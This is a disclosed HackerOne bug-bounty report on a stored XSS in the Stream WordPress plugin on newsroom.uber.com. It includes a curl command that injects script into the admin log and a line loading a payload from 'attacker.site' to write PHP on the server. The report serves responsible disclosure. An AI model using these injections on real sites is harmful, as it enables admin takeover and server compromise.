{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-07-27T19:39:41.718Z", 
    "voters": [
        "delimitry", 
        "michiel", 
        "shailesh4594", 
        "bogdantcaciuc", 
        "muhammad_uwais", 
        "vijay_kumar", 
        "japz", 
        "smit", 
        "secbughunter", 
        "spetr0x", 
        "and 7 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "5000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 127948, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-07-27T17:46:15.472Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Stored XSS on newsroom.uber.com admin panel / Stream WordPress plugin", 
    "is_member_of_team?": null, 
    "vote_count": 17, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-08-26T17:46:15.549Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$5,000", 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-04-04T22:38:49.929Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-04T22:38:49.929Z", 
            "actor": {
                "username": "bugtriage-josh", 
                "url": "/bugtriage-josh", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Hello @jouko,\n\nThank you for your report. Can you demonstrate a location where this XSS vulnerability is possible? Does this XSS effect Uber users or just the admins? Also, do you have any suggested ways to mitigate this issue?  A proof of concept with pictures and or video would also be helpful in confirming this issue.\n\nThank you for thinking of Uber security.", 
            "markdown_message": "<p>Hello <a href=\"/jouko\">@jouko</a>,</p>\n\n<p>Thank you for your report. Can you demonstrate a location where this XSS vulnerability is possible? Does this XSS effect Uber users or just the admins? Also, do you have any suggested ways to mitigate this issue?  A proof of concept with pictures and or video would also be helpful in confirming this issue.</p>\n\n<p>Thank you for thinking of Uber security.</p>\n", 
            "type": "Activities::BugNeedsMoreInfo", 
            "id": 888684, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-05T00:08:02.748Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-05T00:08:02.748Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "It is a stored XSS against logged in WordPress users only. After my tests there should be some injected <script> and <img> tags visible on the page https://newsroom.uber.com/wp-admin/admin.php?page=wp_stream (unless there is a lot of other tracked activity that has pushed them away from the latest activity).\n\nFor mitigating: I have been in contact with Stream authors. They (Luke Carbis) indicated yesterday that they are working on a patch and press release as soon as possible. After that, updating the plugin to the latest version will fix the problem. I can make a video that demonstrates how this can be exploited for server-side compromise.", 
            "markdown_message": "<p>It is a stored XSS against logged in WordPress users only. After my tests there should be some injected &lt;script&gt; and &lt;img&gt; tags visible on the page <a title=\"https://newsroom.uber.com/wp-admin/admin.php?page=wp_stream\" href=\"/redirect?signature=3678e315641a088f56992773347067e7e645f8a1&amp;url=https%3A%2F%2Fnewsroom.uber.com%2Fwp-admin%2Fadmin.php%3Fpage%3Dwp_stream\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://newsroom.uber.com/wp-admin/admin.php?page=wp_stream</span><i class=\"icon-external-link\"></i></a> (unless there is a lot of other tracked activity that has pushed them away from the latest activity).</p>\n\n<p>For mitigating: I have been in contact with Stream authors. They (Luke Carbis) indicated yesterday that they are working on a patch and press release as soon as possible. After that, updating the plugin to the latest version will fix the problem. I can make a video that demonstrates how this can be exploited for server-side compromise.</p>\n", 
            "type": "Activities::BugNew", 
            "id": 888816, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/083/223/598dc7be0895c13e1ae569dddb80d4ebc8f19129/stream.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225104Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=04cd1ad6adedfd1802b7dc87ccaed024f886e85ac64d8112d6b8ec1e93954656", 
                    "type": "video/mp4", 
                    "id": 83223, 
                    "filename": "stream.mp4"
                }
            ], 
            "automated_response": false, 
            "created_at": "2016-04-05T01:28:45.047Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-05T01:29:02.536Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Here's a quick video I made about this bug. It shows two exploits against a WordPress test system running Stream 1.4.9. The exploits work as described in the original report: they generate a HTTP redirect which the Stream plugin mistakes for an administrative action that has to be tracked and logged. The event contains injected <script> tags.\n\nThe first example just shows an alert box to any administrator who views the Stream event log.\nThe second example injects <script src=\"https://attacker.site/exploit.js\"></script> to load a longer payload script. The payload script uses WordPress AJAX facilities to write attacker-supplied PHP code on the server.", 
            "markdown_message": "<p>Here&#39;s a quick video I made about this bug. It shows two exploits against a WordPress test system running Stream 1.4.9. The exploits work as described in the original report: they generate a HTTP redirect which the Stream plugin mistakes for an administrative action that has to be tracked and logged. The event contains injected &lt;script&gt; tags.</p>\n\n<p>The first example just shows an alert box to any administrator who views the Stream event log.<br>\nThe second example injects &lt;script src=&quot;https://attacker.site/exploit.js&quot;&gt;&lt;/script&gt; to load a longer payload script. The payload script uses WordPress AJAX facilities to write attacker-supplied PHP code on the server.</p>\n", 
            "type": "Activities::Comment", 
            "id": 888875, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-07T16:53:28.532Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-07T16:53:28.532Z", 
            "actor": {
                "username": "notcollin", 
                "url": "/notcollin", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 894220, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-12T18:16:57.585Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-12T18:16:57.585Z", 
            "actor": {
                "username": "notcollin", 
                "url": "/notcollin", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "These ones are a bit slower to fix as they are partially managed by a company outside uber - so ive pinged them a number (4) times to fix this and still working to push the issue with them. Sorry but this one will likely take a while to fix (even though the fix is trivial) :(", 
            "markdown_message": "<p>These ones are a bit slower to fix as they are partially managed by a company outside uber - so ive pinged them a number (4) times to fix this and still working to push the issue with them. Sorry but this one will likely take a while to fix (even though the fix is trivial) :(</p>\n", 
            "type": "Activities::Comment", 
            "id": 901845, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-12T18:17:17.577Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-12T18:17:17.577Z", 
            "actor": {
                "username": "notcollin", 
                "url": "/notcollin", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "You were the first to find though, fyi", 
            "markdown_message": "<p>You were the first to find though, fyi</p>\n", 
            "type": "Activities::Comment", 
            "id": 901846, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-26T12:20:17.891Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-26T12:20:17.891Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Note that also https://transparencyreport.uber.com/ uses a vulnerable Stream plugin.", 
            "markdown_message": "<p>Note that also <a title=\"https://transparencyreport.uber.com/\" href=\"/redirect?signature=524d3cd777618dcab5b4cf1beccba2db7871186f&amp;url=https%3A%2F%2Ftransparencyreport.uber.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://transparencyreport.uber.com/</span><i class=\"icon-external-link\"></i></a> uses a vulnerable Stream plugin.</p>\n", 
            "type": "Activities::Comment", 
            "id": 928550, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-01T08:23:18.755Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-01T08:23:18.755Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "This should be fixed in the latest version of Stream, 3.0.6.", 
            "markdown_message": "<p>This should be fixed in the latest version of Stream, 3.0.6.</p>\n", 
            "type": "Activities::Comment", 
            "id": 994501, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "jouko", 
                "url": "/jouko"
            }, 
            "created_at": "2016-06-15T20:52:50.319Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-15T20:52:50.319Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "This one should be fixed now, please let us know if you can confirm it's `Resolved`.", 
            "markdown_message": "<p>This one should be fixed now, please let us know if you can confirm it&#39;s <code>Resolved</code>.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1015964, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-15T21:22:36.346Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-15T21:22:36.346Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "yep seems so", 
            "markdown_message": "<p>yep seems so</p>\n", 
            "type": "Activities::Comment", 
            "id": 1016002, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-15T21:22:55.684Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-15T21:22:55.684Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "yep seems so", 
            "markdown_message": "<p>yep seems so</p>\n", 
            "type": "Activities::Comment", 
            "id": 1016003, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-06-28T16:16:15.600Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-28T16:16:15.600Z", 
            "actor": {
                "url": "/uber", 
                "profile": {
                    "name": "Uber"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/314/0010251d7088db2a1b236eb594b6371af4492609_medium.png?1514905146"
                }
            }, 
            "team_handle": "uber", 
            "bounty_amount": "5000.0", 
            "collaborator": {
                "username": "jouko", 
                "url": "/jouko"
            }, 
            "message": "@jouko, thanks for the good find and we encourage you to continue bug hunting in the future!", 
            "markdown_message": "<p><a href=\"/jouko\">@jouko</a>, thanks for the good find and we encourage you to continue bug hunting in the future!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 1043374, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-28T17:30:14.824Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-28T17:30:14.824Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "thanks!", 
            "markdown_message": "<p>thanks!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1043552, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-28T17:33:37.117Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-28T17:33:37.117Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1043559, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-07-25T23:48:31.554Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-25T23:48:31.554Z", 
            "actor": {
                "username": "lyoung-uber", 
                "url": "/lyoung-uber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/079/873/a15c66b0ad7834ebe7cd48006c61b58bfe42514e_medium.jpg?1466112878"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Hey @jouko, we actually found a domain that wasn't updated when we first resolved this report. I'm going to reopen this report so it doesn't publicly disclose quite yet until we've had a chance to update that domain. I hope you don't mind, we can approve public disclosure once we've finished updating! Thanks!", 
            "markdown_message": "<p>Hey <a href=\"/jouko\">@jouko</a>, we actually found a domain that wasn&#39;t updated when we first resolved this report. I&#39;m going to reopen this report so it doesn&#39;t publicly disclose quite yet until we&#39;ve had a chance to update that domain. I hope you don&#39;t mind, we can approve public disclosure once we&#39;ve finished updating! Thanks!</p>\n", 
            "type": "Activities::BugReopened", 
            "id": 1086929, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "jouko", 
                "url": "/jouko"
            }, 
            "created_at": "2016-07-27T17:45:01.810Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-27T17:45:01.810Z", 
            "actor": {
                "username": "lyoung-uber", 
                "url": "/lyoung-uber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/079/873/a15c66b0ad7834ebe7cd48006c61b58bfe42514e_medium.jpg?1466112878"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Hey @jouko we got the remaining domain cleaned up. Sorry about that. Thanks for being understanding!", 
            "markdown_message": "<p>Hey <a href=\"/jouko\">@jouko</a> we got the remaining domain cleaned up. Sorry about that. Thanks for being understanding!</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1091244, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-07-27T17:46:15.503Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-27T17:46:15.503Z", 
            "actor": {
                "username": "lyoung-uber", 
                "url": "/lyoung-uber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/079/873/a15c66b0ad7834ebe7cd48006c61b58bfe42514e_medium.jpg?1466112878"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "first_to_agree": true, 
            "message": "Since we re-opened the report you'll have to approve public disclosure again but I'm requesting it now so you can approve it whenever convenient. Thanks again for the report!", 
            "markdown_message": "<p>Since we re-opened the report you&#39;ll have to approve public disclosure again but I&#39;m requesting it now so you can approve it whenever convenient. Thanks again for the report!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1091250, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-07-27T19:39:41.760Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-27T19:39:41.760Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1091531, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-07-27T19:39:41.901Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-27T19:39:41.901Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1091532, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "jouko", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/jouko", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/013/642/84ded716b305011af6c7091e630ca8ac2c590a87_small.jpg?1423004250"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 60, 
        "name": "Cross-site Scripting (XSS) - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -71903088.91861951, 
    "disclosed_at": "2016-07-27T19:39:41.866Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/127948", 
    "created_at": "2016-04-03T09:22:57.277Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p><em>newsroom.uber.com</em> uses a WordPress plugin called Stream to log user activity. In some cases the logged events aren&#39;t sanitized properly and can contain HTML tags and JavaScript. An unauthenticated user can produce such a log message to inject JavaScript in the admin panel. When an administrator views the log, the script would be evaluated with administrator privilegs and can (under normal setup) be further used to inject attacker-supplied PHP code on the server.</p>\n\n<h1 id=\"reproducing\">Reproducing</h1>\n\n<p>The following command line can be used to inject JavaScript in the log with the <em>curl</em> tool:</p>\n<pre class=\"highlight plaintext\"><code>curl -v -H &#39;Referer: /hello?plugin-editor.php&amp;file=aaa%3cscript%3ealert(%27stored%20xss%27);%3c/script%3e&#39; --data &#39;post-password=foo&#39; &#39;https://newsroom.uber.com/wp-login.php?action=postpass&#39;\n</code></pre>\n<p>Next, if an administrator clicks the Stream tab in the WordPress Dashboard, an alert box should pop up.</p>\n\n<h1 id=\"details\">Details</h1>\n\n<p>The Stream plugin hooks many WordPress events to log user activity. In the file <em>connectors/installer.php</em> there is a <em>wp_redirect()</em> hook - the plugin checks every URL redirection to see if it involved the plugin editor. The code, compacted a bit:</p>\n<pre class=\"highlight php\"><code>        public static function callback_wp_redirect( $location ) {\n                if ( ! preg_match( &#39;#(plugin)-editor.php#&#39;, $location, $match ) ) {\n                        return $location;\n                }\n                $type = $match[1];\n                list( $url, $query ) = explode( &#39;?&#39;, $location );\n                $query = wp_parse_args( $query );\n                $file  = $query[&#39;file&#39;];\n                if ( empty( $query[&#39;file&#39;] ) ) {\n                        return $location;\n                }\n                /* SNIP ... */ elseif ( &#39;plugin&#39; === $type ) {\n                        global $plugin, $plugins;\n                        $plugin_base = current( explode( &#39;/&#39;, $plugin ) );\n                        foreach ( $plugins as $key =&gt; $plugin_data ) {\n                                if ( $plugin_base === current( explode( &#39;/&#39;, $key ) ) ) {\n                                        $name = $plugin_data[&#39;Name&#39;];\n                                        break;\n                                }\n                        }\n                }\n                self::log(\n                        _x(\n                                &#39;Edited %1$s: %2$s&#39;,\n                                &#39;Plugin/theme editing. 1: Type (plugin/theme), 2: Plugin/theme name&#39;,\n                                &#39;stream&#39;\n                        ),\n                        compact( &#39;type&#39;, &#39;name&#39;, &#39;file&#39; ),null, array( $type . &#39;s&#39; =&gt; &#39;edited&#39; ));\n\n</code></pre>\n<p>So if there is a redirect to a URL containing the string &quot;plugin-editor.php&quot; with a <em>file</em> query parameter, then the activity is logged. The <em>file</em> query parameter is included in the log entry.</p>\n\n<p>The event is saved in Stream&#39;s database table and shown on the main tab of the plugin without sufficient HTML sanitizing.</p>\n\n<p>There are many ways to generate an HTTP redirect in WordPress. The method used in the above example is requesting <em>wp-login.php</em> which, with appropriate arguments, redirects the browser back to the Referer: header&#39;s value.</p>\n\n<h1 id=\"impact\">Impact</h1>\n\n<p>The JavaScript stored by an unauthenticated attacker would get executed with administrator privileges, thus having full control over the site contents. Under a normal WordPress setup it could also modify existing PHP files via the plugin or theme editors, leading to server-side compromise.</p>\n\n<p>I tested this on my local test system with the latest WordPress and Stream 1.4.9.</p>\n", 
    "vulnerability_information": "*newsroom.uber.com* uses a WordPress plugin called Stream to log user activity. In some cases the logged events aren't sanitized properly and can contain HTML tags and JavaScript. An unauthenticated user can produce such a log message to inject JavaScript in the admin panel. When an administrator views the log, the script would be evaluated with administrator privilegs and can (under normal setup) be further used to inject attacker-supplied PHP code on the server.\n\n#Reproducing#\nThe following command line can be used to inject JavaScript in the log with the *curl* tool:\n~~~~\ncurl -v -H 'Referer: /hello?plugin-editor.php&file=aaa%3cscript%3ealert(%27stored%20xss%27);%3c/script%3e' --data 'post-password=foo' 'https://newsroom.uber.com/wp-login.php?action=postpass'\n~~~~\nNext, if an administrator clicks the Stream tab in the WordPress Dashboard, an alert box should pop up.\n\n#Details#\nThe Stream plugin hooks many WordPress events to log user activity. In the file *connectors/installer.php* there is a *wp_redirect()* hook - the plugin checks every URL redirection to see if it involved the plugin editor. The code, compacted a bit:\n\n~~~~php\n        public static function callback_wp_redirect( $location ) {\n                if ( ! preg_match( '#(plugin)-editor.php#', $location, $match ) ) {\n                        return $location;\n                }\n                $type = $match[1];\n                list( $url, $query ) = explode( '?', $location );\n                $query = wp_parse_args( $query );\n                $file  = $query['file'];\n                if ( empty( $query['file'] ) ) {\n                        return $location;\n                }\n                /* SNIP ... */ elseif ( 'plugin' === $type ) {\n                        global $plugin, $plugins;\n                        $plugin_base = current( explode( '/', $plugin ) );\n                        foreach ( $plugins as $key => $plugin_data ) {\n                                if ( $plugin_base === current( explode( '/', $key ) ) ) {\n                                        $name = $plugin_data['Name'];\n                                        break;\n                                }\n                        }\n                }\n                self::log(\n                        _x(\n                                'Edited %1$s: %2$s',\n                                'Plugin/theme editing. 1: Type (plugin/theme), 2: Plugin/theme name',\n                                'stream'\n                        ),\n                        compact( 'type', 'name', 'file' ),null, array( $type . 's' => 'edited' ));\n\n~~~~\nSo if there is a redirect to a URL containing the string \"plugin-editor.php\" with a *file* query parameter, then the activity is logged. The *file* query parameter is included in the log entry.\n\nThe event is saved in Stream's database table and shown on the main tab of the plugin without sufficient HTML sanitizing.\n\nThere are many ways to generate an HTTP redirect in WordPress. The method used in the above example is requesting *wp-login.php* which, with appropriate arguments, redirects the browser back to the Referer: header's value.\n\n#Impact#\nThe JavaScript stored by an unauthenticated attacker would get executed with administrator privileges, thus having full control over the site contents. Under a normal WordPress setup it could also modify existing PHP files via the plugin or theme editors, leading to server-side compromise.\n\nI tested this on my local test system with the latest WordPress and Stream 1.4.9.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.uber.com", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Uber"
        }, 
        "handle": "uber", 
        "url": "https://hackerone.com/uber", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/314/826c90cba1555458df787ae914793cd5070e18df_small.png?1514905146", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/314/0010251d7088db2a1b236eb594b6371af4492609_medium.png?1514905146"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 314, 
        "default_currency": "usd"
    }, 
    "is_published": false
}